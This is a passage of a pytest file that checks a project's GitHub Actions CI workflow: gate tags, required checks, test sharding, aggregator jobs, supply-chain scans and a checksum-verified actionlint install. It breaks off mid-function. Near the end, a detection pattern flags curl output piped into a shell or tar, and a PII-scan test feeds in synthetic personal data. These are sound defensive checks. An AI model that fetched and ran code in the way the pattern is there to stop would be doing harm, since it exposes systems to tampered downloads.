"""CI gates (master §11 testing incl. type checking, §31 G1/G3, §45 security/test tools, §06 table).

The workflow itself runs on GitHub; these tests pin its structure (what each gate runs) and the local
tooling it calls, so a removed gate or a weakened scan fails here first."""

from __future__ import annotations

import importlib.util
import json
import re
import sys
from pathlib import Path

import pytest

from aeos.core.paths import repo_root

ROOT = repo_root()
CI = (ROOT / ".github" / "workflows" / "ci.yml").read_text(encoding="utf-8")


def _script(name: str):
    path = ROOT / "scripts" / f"{name}.py"
    spec = importlib.util.spec_from_file_location(f"aeos_script_{name}", path)
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = mod
    spec.loader.exec_module(mod)
    return mod


def test_g1_runs_lint_types_and_scans_and_g3_runs_browser_tests():
    assert "python -m ruff check backend tests scripts" in CI
    assert "python -m mypy" in CI  # §11 type checking is a gate, not only configured
    assert "python scripts/secret_scan.py" in CI
    assert "tests/e2e/test_ui_smoke.py" in CI and "playwright install --with-deps chromium" in CI
    assert "npx tsc -b --noEmit" in CI and "npm test" in CI


def test_supply_chain_reports_are_produced_and_labelled_report_only():
    for needle in ("scripts/supply_chain.py sbom", "scripts/supply_chain.py licenses", "pip_audit", "npm audit",
                   "bandit"):
        assert needle in CI, needle
    job = CI.split("supply-chain:", 1)[1]
    assert "[NO-GATE]" in job.splitlines()[1]  # report-only: never counted as a gate pass
    assert "pip-audit==" in job and "bandit==" in job  # tools pinned to exact versions


def test_every_job_names_its_gates_explicitly():
    """Every check-run name carries its gates. A matrix job is checked per matrix combination. The G1 static checks
    have a job of their own (``static checks [G1]``), so the backend shards claim G2 only."""
    from aeos.delivery.provider import classify_check

    raw = re.findall(r"^\s{4}name:\s*(.+)$", CI, flags=re.M)
    jobs = _workflow()["jobs"]
    assert raw and len(raw) == len(jobs)  # every job is named
    names = [n for job in jobs.values() for n in _check_names(job)]
    assert len(names) >= len(jobs)
    for name in names:
        assert "${{" not in name, name
        assert re.search(r"\[(G[0-8](,G[0-8])*|NO-GATE)\]", name), name
    assert classify_check("backend shard 2/3 [G2] (windows-latest)") == ["G2"]
    assert classify_check("static checks [G1] (ubuntu-latest)") == ["G1"]
    assert classify_check("backend [G1,G2] (ubuntu-latest)") == ["G1", "G2"]
    assert classify_check("supply-chain report [NO-GATE] (SBOM)") == []
    assert classify_check("frontend [G1,G3]") == ["G1", "G3"]
    assert "G1" in classify_check("lint")  # untagged provider checks keep the name heuristics


def test_mypy_baseline_only_shrinks():
    """The ratcheted baseline may lose entries (a module got fixed) but never gain one - it is now empty."""
    import tomllib

    data = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))
    overrides = data["tool"]["mypy"].get("overrides") or []
    exempt = {m for o in overrides if o.get("ignore_errors") for m in o.get("module", [])}
    baseline_2026_10_19 = {
        "aeos.broker.git_broker", "aeos.broker.grants", "aeos.broker.model_proxy", "aeos.cost.service",
        "aeos.delivery.pr_bundle", "aeos.docs_engine.renderer", "aeos.doctor.capabilities",
        "aeos.doctor.checks.delivery", "aeos.doctor.checks.evidence", "aeos.doctor.checks.secret", "aeos.doctor.cli",
        "aeos.doctor.views", "aeos.inventory.drift", "aeos.inventory.manifest", "aeos.inventory.snapshots",
        "aeos.inventory.views", "aeos.planning.dag", "aeos.policy.decisions", "aeos.policy.queue",
        "aeos.policy.router", "aeos.policy.snapshot", "aeos.proposals.review", "aeos.publisher.jobs",
        "aeos.publisher.targets", "aeos.routing.catalog", "aeos.routing.service", "aeos.worker_runtime.executor",
        "aeos.worker_runtime.opencode", "aeos.worker_runtime.processes", "aeos.worker_runtime.sandbox",
        "aeos.workforce.demo", "aeos.workforce.loop", "aeos.workforce.scheduler",
    }
    assert exempt <= baseline_2026_10_19, sorted(exempt - baseline_2026_10_19)
    # fixed modules never return to the exemption (cleaned 2026-10-19 by K4)
    fixed = {m for m in baseline_2026_10_19 if m.startswith(("aeos.docs_engine.", "aeos.doctor.", "aeos.inventory."))}
    fixed |= {"aeos.policy.decisions", "aeos.policy.router", "aeos.policy.snapshot", "aeos.publisher.targets",
              "aeos.routing.catalog", "aeos.routing.service", "aeos.worker_runtime.processes",
              "aeos.workforce.demo", "aeos.workforce.loop"}
    # ... and the rest on 2026-10-26 (W6-040): no module is exempt any more
    fixed |= {"aeos.broker.git_broker", "aeos.broker.grants", "aeos.broker.model_proxy", "aeos.cost.service",
              "aeos.delivery.pr_bundle", "aeos.planning.dag", "aeos.policy.queue", "aeos.proposals.review",
              "aeos.publisher.jobs", "aeos.worker_runtime.executor", "aeos.worker_runtime.opencode",
              "aeos.worker_runtime.sandbox", "aeos.workforce.scheduler"}
    assert fixed == baseline_2026_10_19 and not (exempt & fixed), sorted(exempt & fixed)
    assert len(exempt) == 0, sorted(exempt)
    # no override may switch errors off for any module, old or new
    assert not [o for o in overrides if o.get("ignore_errors")], overrides


def test_pii_scan_flags_personal_data_and_tenant_hosts_in_templates():
    scan = _script("secret_scan")
    assert scan.PII_SCOPES == ("blueprints/", "contracts/", "docs/")
    found = scan.pii_findings("blueprints/x.md", "owner: budi" + "@" + "corp-mail.co.id\nhp 0812-3456-7890\n"
                              "wiki https://acme-corp.atlassian.net/wiki\n")
    assert any("EMAIL" in f for f in found) and any("PHONE" in f for f in found)
    assert any("tenant/company host" in f for f in found)
    assert scan.pii_findings("docs/y.md", "contact someone@example.com at https://your-tenant.atlassian.net") == []
    assert scan.pii_findings("contracts/z.json", '{"id": "289f8778-6cba-415a-8323-2390263811d2"}') == []


def test_sbom_is_cyclonedx_and_deterministic():
    sc = _script("supply_chain")
    a, b = sc.build_sbom(), sc.build_sbom()
    assert a == b and a["bomFormat"] == "CycloneDX" and a["specVersion"] == "1.5"
    purls = {c["purl"] for c in a["components"]}
    assert any(p.startswith("pkg:pypi/fastapi@") for p in purls)
    assert any(p.startswith("pkg:npm/react@") for p in purls)
    assert a["metadata"]["component"]["name"] == "dly-aeos"


def test_licence_report_never_guesses_and_is_report_only():
    sc = _script("supply_chain")
    rep = sc.license_report()
    assert rep["status"] == "REPORT_ONLY" and rep["policy"] is None
    by_name = {i["name"]: i for i in rep["items"]}
    assert "fastapi" in by_name and by_name["fastapi"]["license"] != ""
    assert set(rep["unknown"]) == {i["name"] for i in rep["items"] if i["license"] == "UNKNOWN"}


@pytest.mark.parametrize("tool", ["IaC", "DAST", "load"])
def test_not_applicable_security_tools_are_recorded_with_a_reason(tool):
    adr = (ROOT / "docs" / "decisions" / "ADR-0095-ci-gates-supply-chain-and-security-tooling.md").read_text(
        encoding="utf-8")
    assert tool in adr and "NOT_APPLICABLE" in adr


def test_sbom_cli_writes_json(tmp_path: Path):
    sc = _script("supply_chain")
    out = tmp_path / "sbom.json"
    assert sc.main(["sbom", "-o", str(out)]) == 0
    assert json.loads(out.read_text(encoding="utf-8"))["components"]


# ------------------------------------------------------------------ W6-106 / W6-135: CI controls for the scans
def _workflow() -> dict:
    import yaml

    return yaml.safe_load(CI)


_MATRIX_REF = re.compile(r"\$\{\{\s*matrix\.([A-Za-z0-9_-]+)\s*\}\}")


def _matrix_combinations(job: dict) -> list[dict]:
    """The combinations of a job's matrix, for the shapes this workflow uses: list axes (their product) and/or
    ``include`` entries (each one extends the matching combinations, or is a combination of its own)."""
    matrix = (job.get("strategy") or {}).get("matrix") or {}
    assert "exclude" not in matrix, "matrix exclude is not modelled by this test"
    axes = {k: v for k, v in matrix.items() if k != "include"}
    assert all(isinstance(v, list) for v in axes.values()), axes
    combos: list[dict] = [{}] if axes else []
    for key, values in axes.items():
        combos = [{**c, key: v} for c in combos for v in values]
    for extra in matrix.get("include") or []:
        matching = [c for c in combos if all(c.get(k) == v for k, v in extra.items() if k in axes)]
        if matching and axes:
            for c in matching:
                c.update(extra)
        else:
            combos.append(dict(extra))
    return combos


def _check_names(job: dict) -> list[str]:
    """The check-run name(s) a job reports: its name per matrix combination."""
    name = str(job.get("name") or "")
    combos = _matrix_combinations(job) or [{}]
    return [_MATRIX_REF.sub(lambda m, c=c: str(c.get(m.group(1), m.group(0))), name) for c in combos]


def _runners(job: dict) -> set[str]:
    runs_on = str(job.get("runs-on") or "")
    combos = _matrix_combinations(job) or [{}]
    return {_MATRIX_REF.sub(lambda m, c=c: str(c.get(m.group(1), m.group(0))), runs_on) for c in combos}


# ------------------------------------------------------------------ CI in about ten minutes (ADR-0115 amendment)
HOST_OSES = ("windows-latest", "macos-latest", "macos-26-intel")
# The required status checks of the ruleset on main (GitHub Actions app): the one list that
# .github/rulesets/main.json must equal (github_settings.py --apply writes that file to GitHub). Each name must keep
# existing in exactly one job of ALL workflows (ci.yml, and pr-title.yml for ``pr title [G1]``), and must only pass
# when everything it stands for passed.
REQUIRED_CHECKS = (
    *(f"backend [G1,G2] ({o})" for o in HOST_OSES),
    *(f"bootstrap [G2] ({o})" for o in HOST_OSES),
    "browser e2e + a11y smoke [G3]",
    "frontend [G1,G3]",
    "commit subjects [G1]",
    "pr title [G1]",
)


def _other_workflow_check_names() -> list[str]:
    """Check names of every workflow except ci.yml (whose jobs ``_workflow()`` and the callers below handle)."""
    import yaml

    names: list[str] = []
    for path in sorted((ROOT / ".github" / "workflows").glob("*.y*ml")):
        if path.name == "ci.yml":
            continue
        doc = yaml.safe_load(path.read_text(encoding="utf-8"))
        names += [n for job in doc["jobs"].values() for n in _check_names(job)]
    return names


def _all_workflow_check_names(ci_jobs: dict | None = None) -> list[str]:
    jobs = _workflow()["jobs"] if ci_jobs is None else ci_jobs
    return [n for job in jobs.values() for n in _check_names(job)] + _other_workflow_check_names()


def _ruleset_required_contexts() -> list[str]:
    ruleset = json.loads((ROOT / ".github" / "rulesets" / "main.json").read_text(encoding="utf-8"))
    rule = next(r for r in ruleset["rules"] if r["type"] == "required_status_checks")
    return [c["context"] for c in rule["parameters"]["required_status_checks"]]


def test_every_required_check_of_the_main_ruleset_is_reported_by_exactly_one_job():
    names = _all_workflow_check_names()
    for required in REQUIRED_CHECKS:
        assert names.count(required) == 1, (required, names.count(required))


def _ruleset_problems(contexts: list[str]) -> list[str]:
    problems = [f"duplicate context {c!r}" for c in sorted(set(contexts)) if contexts.count(c) > 1]
    problems += [f"ruleset lacks required check {c!r}" for c in REQUIRED_CHECKS if c not in contexts]
    problems += [f"ruleset requires {c!r}, which REQUIRED_CHECKS lacks" for c in contexts if c not in REQUIRED_CHECKS]
    return problems


def test_required_checks_equal_the_contexts_of_the_ruleset_file():
    """REQUIRED_CHECKS and .github/rulesets/main.json are one list: a context added to one and not the other is red,
    so a ruleset cannot require a name no workflow reports (the merge would wait for ever) nor drop a gate quietly."""
    assert _ruleset_problems(_ruleset_required_contexts()) == []


# Every job id of ci.yml except the shard jobs, with its name (the check-run name a ruleset or classify_check sees). The
# shard jobs are pinned by their id, name template and legs (SHARDS_PER_OS): a rebalance changes the leg counts, not
# the template. This is the committed baseline, so a renamed or dropped job is red in every checkout, also in CI where
# only the pull request's merge ref is fetched and there is no origin/main to compare with.
JOB_NAMES = {
    "static-checks": "static checks [G1] (ubuntu-latest)",
    "backend-verifier-macos-latest": "backend verifier [G2] (macos-latest)",
    "backend-windows-latest": "backend [G1,G2] (windows-latest)",
    "backend-macos-latest": "backend [G1,G2] (macos-latest)",
    "backend-macos-26-intel": "backend [G1,G2] (macos-26-intel)",
    "frontend": "frontend [G1,G3]",
    "browser-e2e": "browser e2e + a11y smoke [G3]",
    "bootstrap": "bootstrap [G2] (${{ matrix.os }})",
    "commit-subjects": "commit subjects [G1]",
    "supply-chain": "supply-chain report [NO-GATE] (SBOM, licences, vulnerabilities, SAST)",
}
SHARD_JOB_NAME = "backend shard ${{ matrix.shard }}/${{ matrix.shards }} [G2] (${{ matrix.os }})"


def _job_name_problems(jobs: dict) -> list[str]:
    expected = {**JOB_NAMES, **{f"backend-shards-{o}": SHARD_JOB_NAME for o in HOST_OSES}}
    problems = [f"{jid}: name {jobs[jid].get('name')!r}, expected {name!r}"
                for jid, name in expected.items() if jid in jobs and jobs[jid].get("name") != name]
    problems += [f"job {jid} is missing" for jid in expected if jid not in jobs]
    problems += [f"job {jid} is not pinned in JOB_NAMES" for jid in jobs if jid not in expected]
    names = _all_workflow_check_names(jobs)
    problems += [f"required check {r!r} reported {names.count(r)} times" for r in REQUIRED_CHECKS if names.count(r) != 1]
    return problems


def test_no_job_id_or_check_name_changed_against_the_committed_baseline():
    assert _job_name_problems(_workflow()["jobs"]) == []


def test_the_job_name_check_bites_on_a_renamed_dropped_or_unpinned_job_without_any_git_history():
    """Runs the same in CI (a depth-1 merge-ref checkout): no git command, no origin/main."""
    import copy

    jobs = _workflow()["jobs"]
    assert _job_name_problems(jobs) == []
    for jid in JOB_NAMES:
        renamed = copy.deepcopy(jobs)
        renamed[jid]["name"] += " renamed"
        assert _job_name_problems(renamed), jid
        dropped = copy.deepcopy(jobs)
        del dropped[jid]
        assert _job_name_problems(dropped), jid
    shard_renamed = copy.deepcopy(jobs)
    shard_renamed["backend-shards-macos-latest"]["name"] = "backend shard [G2] (${{ matrix.os }})"
    assert _job_name_problems(shard_renamed)
    extra = copy.deepcopy(jobs)
    extra["new-job"] = {"name": "new job [G1]", "runs-on": "ubuntu-latest", "steps": []}
    assert _job_name_problems(extra)


def test_a_required_name_that_only_pr_title_yml_reports_is_found_there_and_missing_without_it(monkeypatch):
    """Near miss: ``pr title [G1]`` is not a job of ci.yml, yet the check is green because the other workflows count.
    Violating: the same ci.yml jobs with pr-title.yml renamed or dropped report the name 0 times."""
    jobs = _workflow()["jobs"]
    assert "pr title [G1]" not in [n for job in jobs.values() for n in _check_names(job)]
    assert _job_name_problems(jobs) == []
    monkeypatch.setattr(sys.modules[__name__], "_other_workflow_check_names", lambda: ["pr title"])
    assert "required check 'pr title [G1]' reported 0 times" in _job_name_problems(jobs)


def test_the_ruleset_file_and_required_checks_bite_when_they_differ():
    contexts = _ruleset_required_contexts()
    assert _ruleset_problems(contexts) == []
    assert _ruleset_problems([c for c in contexts if c != "pr title [G1]"]) == [
        "ruleset lacks required check 'pr title [G1]'"]
    assert _ruleset_problems([*contexts, "lint"]) == ["ruleset requires 'lint', which REQUIRED_CHECKS lacks"]
    assert _ruleset_problems([*contexts, "frontend [G1,G3]"]) == ["duplicate context 'frontend [G1,G3]'"]


def _push_to_main_problems(workflows: dict[str, dict]) -> list[str]:
    """Required checks that no job reports on a push to main. ``ci_status.py --after-merge`` judges the merge commit
    against the required contexts of the live ruleset; a context without a check run there (not even a skipped one,
    which counts as OK) stays PENDING until the deadline and every merge ends unverified."""
    reported: set[str] = set()
    for doc in workflows.values():
        on = doc.get("on", doc.get(True)) or {}
        push = on.get("push") if isinstance(on, dict) else None
        if isinstance(on, dict) and "push" in on and (push or {}).get("branches", ["main"]) == ["main"]:
            reported |= {n for job in doc["jobs"].values() for n in _check_names(job)}
    return [f"required check {r!r} has no check run on a push to main" for r in REQUIRED_CHECKS if r not in reported]


def test_every_required_check_has_a_check_run_on_the_merge_commit_on_main():
    """Near miss: the real workflows (ci.yml and pr-title.yml both run on push to main; a job that only makes sense on
    a pull request is skipped there by its ``if``, which is an OK check run). Violating: pr-title.yml without its push
    trigger leaves ``pr title [G1]`` without a run on main."""
    import copy

    workflows = _workflow_files()
    assert _push_to_main_problems(workflows) == []
    no_push = copy.deepcopy(workflows)
    on = no_push["pr-title.yml"].get("on", no_push["pr-title.yml"].get(True))
    del on["push"]
    assert _push_to_main_problems(no_push) == ["required check 'pr title [G1]' has no check run on a push to main"]
    dropped = {k: v for k, v in workflows.items() if k != "pr-title.yml"}
    assert _push_to_main_problems(dropped) == ["required check 'pr title [G1]' has no check run on a push to main"]


def _aggregator(os_label: str) -> tuple[str, dict]:
    jobs = _workflow()["jobs"]
    return next((jid, j) for jid, j in jobs.items() if j.get("name") == f"backend [G1,G2] ({os_label})")


STATIC_JOB = "static-checks"


def _aggregator_problems(jobs: dict) -> list[str]:
    """What is wrong with the three required ``backend [G1,G2] (<os>)`` jobs of *jobs* (a parsed workflow): each must
    need the static job and every backend job of its OS, run under ``if: always()`` on ubuntu-latest, and report
    exactly the results of the jobs it needs."""
    problems = []
    for os_label in HOST_OSES:
        found = [(jid, j) for jid, j in jobs.items() if j.get("name") == f"backend [G1,G2] ({os_label})"]
        if len(found) != 1:
            problems.append(f"{os_label}: {len(found)} aggregator jobs")
            continue
        agg_id, agg = found[0]
        if agg.get("runs-on") != "ubuntu-latest" or agg.get("if") != "always()":
            problems.append(f"{os_label}: must run on ubuntu-latest under if: always()")
        needs = agg["needs"] if isinstance(agg.get("needs"), list) else [agg.get("needs")]
        on_os = {jid for jid, j in jobs.items()
                 if jid != agg_id and str(j.get("name", "")).startswith("backend") and os_label in _runners(j)}
        if set(needs) != on_os | {STATIC_JOB} or not on_os:
            problems.append(f"{os_label}: needs {sorted(map(str, needs))}, expected {sorted(on_os | {STATIC_JOB})}")
        results = ((agg.get("steps") or [{}])[0].get("env") or {}).get("RESULTS", "")
        pairs = re.findall(r"(\S+)=\$\{\{ needs\.(\S+)\.result \}\}", results)
        if not all(a == b for a, b in pairs) or sorted(a for a, _ in pairs) != sorted(map(str, needs)):
            problems.append(f"{os_label}: RESULTS {results!r} does not list the needed jobs")
    return problems


def test_backend_required_names_are_aggregators_over_the_static_job_and_every_backend_job_of_their_os():
    """The required name of an OS needs the G1 static job and all backend jobs on that OS (every shard; on
    macos-latest also the real verifier run), runs even when they failed, were skipped or cancelled (if: always())
    and then reports their result. It runs no test itself."""
    jobs = _workflow()["jobs"]
    assert _aggregator_problems(jobs) == []
    scripts = set()
    for os_label in HOST_OSES:
        _, agg = _aggregator(os_label)
        (step,) = agg["steps"]
        assert step["shell"] == "bash" and "uses" not in step
        entry = re.compile(r"(\S+)=\$\{\{ needs\.(\S+)\.result \}\}")
        assert not entry.sub("", step["env"]["RESULTS"]).strip(), step["env"]["RESULTS"]  # only job=result entries
        scripts.add(step["run"])
    assert len(scripts) == 1, "the three aggregators run the same check"
    assert {STATIC_JOB, "backend-shards-macos-latest", "backend-verifier-macos-latest"} <= set(
        _aggregator("macos-latest")[1]["needs"])


@pytest.mark.parametrize("os_label", HOST_OSES)
def test_the_aggregator_check_bites_when_a_needed_job_is_dropped_or_a_result_is_not_listed(os_label: str):
    """Near miss green (the real workflow), violations red: no static job, no shard job, a result left out."""
    import copy

    jobs = _workflow()["jobs"]
    agg_id, _ = _aggregator(os_label)
    shard_id = f"backend-shards-{os_label}"
    for drop in (STATIC_JOB, shard_id):
        mutated = copy.deepcopy(jobs)
        mutated[agg_id]["needs"].remove(drop)
        mutated[agg_id]["steps"][0]["env"]["RESULTS"] = re.sub(
            rf"\s*{re.escape(drop)}=\$\{{\{{ needs\.{re.escape(drop)}\.result \}}\}}", "",
            mutated[agg_id]["steps"][0]["env"]["RESULTS"])
        assert _aggregator_problems(mutated), drop
    unlisted = copy.deepcopy(jobs)
    unlisted[agg_id]["steps"][0]["env"]["RESULTS"] = re.sub(
        rf"\s*{STATIC_JOB}=\$\{{\{{ needs\.{STATIC_JOB}\.result \}}\}}", "", unlisted[agg_id]["steps"][0]["env"]["RESULTS"])
    assert _aggregator_problems(unlisted)
    skippable = copy.deepcopy(jobs)
    skippable[agg_id]["if"] = "success()"
    assert _aggregator_problems(skippable)


@pytest.mark.skipif(sys.platform == "win32", reason="the aggregator step runs under bash on ubuntu-latest")
@pytest.mark.parametrize("results, passes", [
    ("a=success", True),
    ("a=success b=success", True),
    ("a=success b=skipped", False),
    ("a=success\nb=failure", False),  # one entry per line: the second line must be read too
    ("a=success\nb=success\n", True),
    ("a=cancelled b=success", False),
    ("a=failure", False),
    ("a=", False),
    ("", False),
])
def test_the_aggregator_passes_only_when_every_needed_job_succeeded(tmp_path: Path, results: str, passes: bool):
    import os
    import shutil
    import subprocess

    bash = shutil.which("bash")
    if bash is None:
        pytest.skip("bash not available")
    script = tmp_path / "aggregate.sh"
    script.write_text(_aggregator("macos-latest")[1]["steps"][0]["run"], encoding="utf-8")
    res = subprocess.run([bash, "--noprofile", "--norc", "-eo", "pipefail", str(script)], capture_output=True,
                         text=True, timeout=60, env={**os.environ, "RESULTS": results})
    assert (res.returncode == 0) is passes, (results, res.returncode, res.stdout, res.stderr)
    res.stdout.encode("ascii")
    assert ("FAIL" in res.stdout) is not passes


# The exact shard command: -n logical (one worker per logical CPU, "-n auto" counts physical cores), the same marker
# selection the single backend job had, and the JUnit report the rebalancing script reads.
SHARD_PYTEST = ('python -m pytest -q -m "not integration and not network" -n logical '
                '--shard ${{ matrix.shard }}/${{ matrix.shards }} --junitxml=junit-backend.xml')
# Shards per host OS (ADR-0115 amendment "rebalanced shards"): Windows jobs do not use the 5 macOS slots of GitHub
# Free, so Windows gets 3; the macOS hosts stay at 2 each (7 macOS jobs already compete for those slots).
SHARDS_PER_OS = {"windows-latest": 3, "macos-latest": 2, "macos-26-intel": 2}


def _shard_jobs(jobs: dict | None = None) -> dict[str, dict]:
    return {jid: j for jid, j in (jobs or _workflow()["jobs"]).items() if jid.startswith("backend-shards-")}


def _shard_leg_problems(jobs: dict) -> list[str]:
    """What is wrong with the shard matrices of *jobs*: every host OS needs exactly the legs 1..N, each leg carrying
    ``shards: N``, with N from SHARDS_PER_OS (a missing leg would silently drop a part of the suite on that OS)."""
    problems = []
    shards = _shard_jobs(jobs)
    if set(shards) != {f"backend-shards-{o}" for o in HOST_OSES}:
        problems.append(f"shard jobs {sorted(shards)}")
    for os_label, total in SHARDS_PER_OS.items():
        combos = _matrix_combinations(shards.get(f"backend-shards-{os_label}", {}))
        if sorted(c.get("shard", 0) for c in combos) != list(range(1, total + 1)):
            problems.append(f"{os_label}: legs {sorted(c.get('shard', 0) for c in combos)}, expected 1..{total}")
        if {c.get("shards") for c in combos} != {total} or {c.get("os") for c in combos} != {os_label}:
            problems.append(f"{os_label}: every leg needs os {os_label} and shards {total}: {combos}")
        if any(set(c) - {"os", "shard", "shards"} for c in combos):
            problems.append(f"{os_label}: unexpected matrix keys {combos}")
    return problems


def test_every_host_os_runs_the_whole_backend_suite_as_shards_with_identical_steps():
    """Sharding splits the suite, it drops nothing (ADR-0115: the full backend suite on every host OS): the shards
    1..N of an OS all run, with the same marker selection the single backend job had, and the OS jobs never drift.
    Every shard is G2 only: the G1 static checks are not in a shard (see the static job)."""
    from aeos.delivery.provider import classify_check

    shards = _shard_jobs()
    assert _shard_leg_problems(_workflow()["jobs"]) == []
    first = next(iter(shards.values()))["steps"]
    for jid, job in shards.items():
        assert job["steps"] == first, f"{jid} differs from the other shard jobs"
        assert job["strategy"]["fail-fast"] is False
        os_label = jid.removeprefix("backend-shards-")
        assert _runners(job) == {os_label}
        (run,) = [s["run"] for s in job["steps"] if "--shard" in (s.get("run") or "")]
        assert run == SHARD_PYTEST, run
        assert "continue-on-error" not in job
        assert not [s for s in job["steps"] if "continue-on-error" in s], "a failing shard step must fail the job"
        assert not [s for s in job["steps"] if str(s.get("name", "")).startswith("G1")], "G1 has its own job"
        assert "gates" not in str(job["strategy"]) and "matrix.gates" not in str(job)
        for name in _check_names(job):
            assert classify_check(name) == ["G2"], name
    assert [n for n in _check_names(shards["backend-shards-windows-latest"])] == [
        f"backend shard {k}/3 [G2] (windows-latest)" for k in (1, 2, 3)]


def test_the_shard_leg_check_bites_on_a_dropped_leg_a_wrong_count_or_a_foreign_os():
    """Near miss green (the real workflow), violations red."""
    import copy

    jobs = _workflow()["jobs"]
    assert _shard_leg_problems(jobs) == []
    dropped = copy.deepcopy(jobs)
    dropped["backend-shards-windows-latest"]["strategy"]["matrix"]["include"].pop()
    assert _shard_leg_problems(dropped)
    old_count = copy.deepcopy(jobs)
    for leg in old_count["backend-shards-windows-latest"]["strategy"]["matrix"]["include"]:
        leg["shards"] = 2
    assert _shard_leg_problems(old_count)
    duplicated = copy.deepcopy(jobs)
    duplicated["backend-shards-macos-latest"]["strategy"]["matrix"]["include"][1]["shard"] = 1
    assert _shard_leg_problems(duplicated)
    foreign = copy.deepcopy(jobs)
    foreign["backend-shards-macos-26-intel"]["strategy"]["matrix"]["include"][0]["os"] = "macos-latest"
    assert _shard_leg_problems(foreign)


BITE_CONTROL_STEP = "actionlint bite control"
G1_STATIC_STEPS = (("ruff", "python -m ruff check backend tests scripts"),
                   ("mypy darwin", "python -m mypy --platform darwin"),
                   ("mypy win32", "python -m mypy --platform win32"),
                   ("secret + PII scan", "python scripts/secret_scan.py"),
                   ("shellcheck", "shellcheck scripts/*.sh scripts/git-hooks/pre-push"),
                   ("actionlint", "actionlint"),
                   (BITE_CONTROL_STEP, None))  # a script of its own, checked by _actionlint_problems


def _static_step_problems(jobs: dict) -> list[str]:
    """What is wrong with the G1 steps of the static job of *jobs*: exactly these commands, one per step (two in one
    ``run`` block under a ``shell: bash {0}`` override, which has no -e, would hide a failing darwin check behind a
    passing win32 one), none skipped, none allowed to fail, none under a shell override."""
    problems = []
    static = [s for s in jobs[STATIC_JOB]["steps"] if str(s.get("name", "")).startswith("G1 static")]
    seen = [(str(s["name"]).split(" — ")[-1].split(" (")[0], None if BITE_CONTROL_STEP in str(s["name"]) else s.get("run"))
            for s in static]
    if seen != list(G1_STATIC_STEPS):
        problems.append(f"G1 steps {[(s['name'], s.get('run')) for s in static]}")
    for step in static:
        if "if" in step or "continue-on-error" in step or "shell" in step:
            problems.append(f"{step['name']}: if / continue-on-error / shell is set")
    return problems


def test_g1_static_checks_run_once_in_their_own_job_that_every_backend_aggregator_needs():
    jobs = _workflow()["jobs"]
    job = jobs[STATIC_JOB]
    assert job["runs-on"] == "ubuntu-latest" and "[G1]" in job["name"] and "if" not in job
    assert "continue-on-error" not in job and "strategy" not in job
    assert _static_step_problems(jobs) == []
    for shard in _shard_jobs().values():  # the tests themselves never depend on a gate tag
        for step in shard["steps"]:
            if "pytest" in (step.get("run") or ""):
                assert "if" not in step
    for os_label in HOST_OSES:
        assert STATIC_JOB in _aggregator(os_label)[1]["needs"]


def test_the_g1_step_check_bites_on_a_shell_override_a_joined_run_block_and_a_dropped_or_tolerated_step():
    """Near miss green (the real workflow), violations red."""
    import copy

    jobs = _workflow()["jobs"]
    assert _static_step_problems(jobs) == []
    steps = lambda j: j[STATIC_JOB]["steps"]  # noqa: E731
    mypy_win = next(s for s in steps(jobs) if s.get("run") == "python -m mypy --platform win32")
    for key, value in (("shell", "bash {0}"), ("continue-on-error", True), ("if", "always()")):
        mutated = copy.deepcopy(jobs)
        next(s for s in steps(mutated) if s.get("run") == mypy_win["run"])[key] = value
        assert _static_step_problems(mutated), key
    joined = copy.deepcopy(jobs)  # the two mypy commands back in one block (the shape that `bash {0}` would mask)
    darwin = next(s for s in steps(joined) if s.get("run") == "python -m mypy --platform darwin")
    darwin["run"] = "python -m mypy --platform darwin\npython -m mypy --platform win32"
    steps(joined).remove(next(s for s in steps(joined) if s.get("run") == "python -m mypy --platform win32"))
    assert _static_step_problems(joined)
    dropped = copy.deepcopy(jobs)
    steps(dropped).remove(next(s for s in steps(dropped) if s.get("run") == "python -m mypy --platform darwin"))
    assert _static_step_problems(dropped)


# ------------------------------------------------------------------ actionlint, shellcheck and PR/main parity
FIXTURES = ROOT / "tests" / "fixtures" / "actionlint"
SHA256_HEX = re.compile(r"^[0-9a-f]{64}$")


def _step(jobs: dict, job_id: str, name_prefix: str) -> dict:
    return next(s for s in jobs[job_id]["steps"] if str(s.get("name", "")).startswith(name_prefix))


def _actionlint_problems(jobs: dict) -> list[str]:
    """What is wrong with the actionlint steps of the static job of *jobs* (a parsed workflow): the install step pins a
    version and a 64-hex SHA-256, compares the downloaded tarball with it BEFORE extracting, over https, with no
    pipe from curl into a shell or tar and no failure swallowed; the plain ``actionlint`` step runs on the workflows;
    the bite control runs both fixtures in CI and checks the exit status and the finding; shellcheck is a step of the
    static job and not of the pull-request-only commit-subjects job."""
    problems: list[str] = []
    steps = jobs[STATIC_JOB]["steps"]
    names = [str(s.get("name", "")) for s in steps]
    installs = [s for s in steps if str(s.get("name", "")).startswith("Install actionlint")]
    lints = [s for s in steps if s.get("name") == "G1 static — actionlint"]
    controls = [s for s in steps if BITE_CONTROL_STEP in str(s.get("name", ""))]
    if len(installs) != 1 or len(lints) != 1 or len(controls) != 1:
        return [f"static-checks needs one install, one actionlint and one bite-control step, has {names}"]
    install, lint, control = installs[0], lints[0], controls[0]
    if not names.index(install["name"]) < names.index(lint["name"]) < names.index(control["name"]):
        problems.append("order must be install, actionlint, bite control")
    env = install.get("env") or {}
    if not SHA256_HEX.match(str(env.get("ACTIONLINT_SHA256", ""))):
        problems.append(f"ACTIONLINT_SHA256 is not a pinned 64-hex digest: {env.get('ACTIONLINT_SHA256')!r}")
    if not re.match(r"^\d+\.\d+\.\d+$", str(env.get("ACTIONLINT_VERSION", ""))):
        problems.append(f"ACTIONLINT_VERSION is not an exact version: {env.get('ACTIONLINT_VERSION')!r}")
    script = str(install.get("run", ""))
    lines = [ln.strip() for ln in script.replace("\\\n", " ").splitlines()]
    verify = [i for i, ln in enumerate(lines) if "sha256sum" in ln and "--check" in ln]
    extract = [i for i, ln in enumerate(lines) if re.match(r"^(tar|unzip|gunzip)\b", ln)]
    if len(verify) != 1 or "ACTIONLINT_SHA256" not in lines[verify[0]]:
        problems.append("the download must be compared with $ACTIONLINT_SHA256 by one `sha256sum --check` line")
    if not extract or (verify and min(extract) < verify[0]):
        problems.append("the archive must be extracted after, never before, the checksum comparison")
    curl = next((ln for ln in lines if ln.startswith("curl ")), "")
    if "--fail" not in curl or "https://github.com/rhysd/actionlint/releases/download/v${ACTIONLINT_VERSION}/" not in curl:
        problems.append(f"curl must fail on HTTP errors and fetch the pinned release over https: {curl!r}")
    if re.search(r"\|\s*(sudo\s+)?(ba|z)?sh\b|curl[^\n|]*\|\s*tar", script):
